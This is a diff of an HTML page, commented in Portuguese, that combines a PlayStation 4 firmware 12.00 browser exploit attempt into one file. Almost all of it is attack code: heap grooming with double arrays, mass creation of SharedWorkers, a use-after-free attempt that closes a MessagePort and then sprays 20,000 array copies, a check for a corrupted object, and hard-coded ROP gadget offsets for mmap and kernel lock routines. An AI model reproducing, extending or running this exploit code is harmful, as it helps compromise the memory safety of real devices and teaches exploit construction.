@@ -2,33 +2,230 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 CLASSIC MODULAR</title>
+    <title>PS4 12.00 LEAK HUNTER (MONOLITH)</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
 </head>
 <body>
 
-    <h1>PS4 12.00 - LEAK HUNTER (Classic JS)</h1>
-    <h3>Modo: Arquivos Separados (Sem ES6 Modules)</h3>
+    <h1>PS4 12.00 - SINGLE FILE EXPLOIT</h1>
+    <h3>Alvo: SharedWorker (0xA0) | Método: Lapse Spray</h3>
 
-    <button id="btn_run">INICIAR TESTE</button>
+    <div class="controls">
+        <button onclick="start_exploit()">INICIAR TESTE</button>
+    </div>
 
-    <div id="log">Carregando scripts...</div>
+    <div id="log">Sistema pronto. Clique para iniciar.</div>
 
     <script>
-        window.onerror = function(msg, url, line) {
-            var d = document.getElementById("log");
-            d.innerHTML += `<div class="fail">ERRO: ${msg} (Linha ${line})</div>`;
+        // =================================================================
+        // 1. CONFIGURAÇÕES & GADGETS
+        // =================================================================
+        const CONFIG = {
+            WORKER_LIMIT: 403,        // Zona de segurança antes do crash
+            SPRAY_QUANTITY: 20000,    // Quantidade massiva para garantir cobertura
+            TARGET_SIZE: 0xA0         // 160 bytes (Do binário)
         };
+
+        const GADGETS = {
+            pop_rdi: 0x2FEB5,
+            sys_mmap: 0x7500,
+            jmp_rsi: 0x47b31,
+            kl_lock: 0xE6C20
+        };
+
+        // =================================================================
+        // 2. UTILITÁRIOS
+        // =================================================================
+        function log(msg, type = "info") {
+            const d = document.getElementById("log");
+            if (!d) return;
+
+            let color = "#8b949e";
+            if (type === "success") color = "#55ff55";
+            if (type === "fail") color = "#ff5555";
+            if (type === "warn") color = "#ffff55";
+            if (type === "leak") color = "#d455ff";
+
+            const entry = document.createElement("div");
+            entry.style.color = color;
+            entry.style.borderBottom = "1px solid #222";
+            entry.style.padding = "2px";
+            
+            const time = new Date().toLocaleTimeString();
+            entry.innerHTML = `[${time}] ${msg}`;
+            
+            d.appendChild(entry);
+            d.scrollTop = d.scrollHeight;
+        }
+
+        // =================================================================
+        // 3. GERENCIAMENTO DE MEMÓRIA (HEAP)
+        // =================================================================
+        var grooming_stash = [];
+
+        function prepare_heap(size) {
+            log(`HEAP: Criando buracos de 0x${size.toString(16)}...`, "info");
+            grooming_stash = [];
+            
+            // Precisamos criar arrays que ocupem exatamente 'size' bytes.
+            // Um Double Array tem overhead de header. 
+            // Para 160 bytes (0xA0), precisamos calcular: 160 - 16 (header) = 144 bytes de dados.
+            // 144 / 8 bytes por double = 18 elementos.
+            
+            // Vamos usar a heurística do Lapse: Arrays de Doubles.
+            const elementCount = Math.floor((size - 16) / 8); 
+            
+            let temp = [];
+            // Aloca 3000 buffers
+            for (let i = 0; i < 3000; i++) {
+                let arr = new Array(elementCount);
+                arr.fill(1.1); // Preenche com doubles
+                temp.push(arr);
+            }
+
+            // Libera alternado (Checkerboard)
+            // [Ocupado] [Livre] [Ocupado] [Livre]
+            let holes = 0;
+            for (let i = 0; i < temp.length; i += 2) {
+                temp[i] = null; // Libera para o GC
+                holes++;
+            }
+            
+            grooming_stash = temp.filter(x => x !== null);
+            log(`HEAP: ${holes} buracos preparados no Butterfly Heap.`, "success");
+        }
+
+        function clear_heap() {
+            grooming_stash = [];
+        }
+
+        // =================================================================
+        // 4. PAYLOAD (DOUBLE ARRAY)
+        // =================================================================
+        function build_payload(size) {
+            const elementCount = Math.floor((size - 16) / 8);
+            const arr = new Array(elementCount);
+            
+            // Valor Marcador: 1.1 (0x3FF199999999999A)
+            // Se o kernel ler isso como ponteiro, é um endereço de Userland seguro.
+            // Se o JS ler isso de volta num objeto corrompido, saberemos.
+            for(let i=0; i<arr.length; i++) {
+                arr[i] = 1.1; 
+            }
+            
+            return arr;
+        }
+
+        // =================================================================
+        // 5. LÓGICA PRINCIPAL (EXPLOIT)
+        // =================================================================
+        var workers_stash = [];
+        var is_running = false;
+        var interval_ref = null;
+
+        async function start_exploit() {
+            if (is_running) return;
+            if (!window.SharedWorker) return log("ERRO: Navegador incompatível.", "fail");
+            
+            is_running = true;
+            const size = CONFIG.TARGET_SIZE;
+            
+            log(`>>> INICIANDO (Tamanho 0x${size.toString(16)}) <<<`, "warn");
+
+            // 1. Preparar Memória
+            prepare_heap(size);
+            
+            // 2. Payload
+            const payload = build_payload(size);
+
+            // 3. Grooming de Workers (Encher até a borda segura)
+            log("Grooming de Workers (380)...");
+            workers_stash = [];
+            for(let i=0; i<380; i++) {
+                try { workers_stash.push(new SharedWorker("data:text/javascript,1", "g"+i)); } catch(e){}
+            }
+
+            // 4. Trigger Loop (Zona de Pressão)
+            let p_count = 0;
+            const limit = CONFIG.WORKER_LIMIT - 380;
+
+            interval_ref = setInterval(() => {
+                if (p_count >= limit) {
+                    clearInterval(interval_ref);
+                    
+                    // O MOMENTO DA VERDADE (Worker 403)
+                    const victim = workers_stash.pop();
+                    
+                    attempt_leak(victim, payload);
+                    
+                    is_running = false;
+                    return;
+                }
+
+                try {
+                    let w = new SharedWorker("data:text/javascript,1", "v_"+p_count);
+                    w.port.start();
+                    workers_stash.push(w);
+                    
+                    if(p_count % 5 == 0) log(`Pressão: ${381+p_count}`);
+                } catch(e) {
+                    log("Erro crítico de alocação: " + e, "fail");
+                }
+                
+                p_count++;
+            }, 60); // 60ms entre alocações
+        }
+
+        function attempt_leak(victim, payload) {
+            log("!!! DISPARANDO UAF (0xA0) !!!", "warn");
+            
+            const port = victim.port;
+            
+            // 1. FREE
+            victim.port.close();
+            
+            // 2. SPRAY (Imediato)
+            // Usamos slice() para clonar o array rapidamente e inundar o heap
+            const spray = [];
+            for (let k = 0; k < CONFIG.SPRAY_QUANTITY; k++) {
+                spray.push(payload.slice(0));
+            }
+
+            // 3. VERIFICAÇÃO
+            setTimeout(() => {
+                try {
+                    const s = port.toString();
+                    
+                    // Se o objeto foi sobrescrito, ele não deve ser mais [object MessagePort]
+                    if (s.indexOf("MessagePort") === -1) {
+                        log("!!! SUCESSO ABSOLUTO !!!", "leak");
+                        log("Objeto Corrompido: " + s, "leak");
+                        document.body.style.backgroundColor = "#004400";
+                        alert("LEAK ENCONTRADO! Tamanho 0xA0 confirmado.");
+                    } else {
+                        log("Falha: Objeto intacto [object MessagePort].");
+                        
+                        // Teste de estresse final: Tentar acessar propriedade
+                        // Se o vtable estiver sujo com 1.1, isso deve causar um crash controlado
+                        try { let temp = port.onmessage; } catch(e) {
+                            if(e.toString().match(/0x/)) {
+                                log("LEAK NO ERRO: " + e, "leak");
+                                alert("LEAK NO ERRO!");
+                            }
+                        }
+                    }
+                } catch (e) {
+                    log("ERRO CAPTURADO (BOM SINAL): " + e, "leak");
+                }
+                
+                // Limpeza
+                workers_stash.forEach(w => { try{w.port.close()}catch(e){} });
+                clear_heap();
+                
+            }, 500);
+        }
+
     </script>
-
-    <script src="utils.js"></script>
-    <script src="config.js"></script>
-    
-    <script src="heap.js"></script>
-    <script src="payloads.js"></script>
-    
-    <script src="exploit.js"></script>
-
 </body>
 </html>
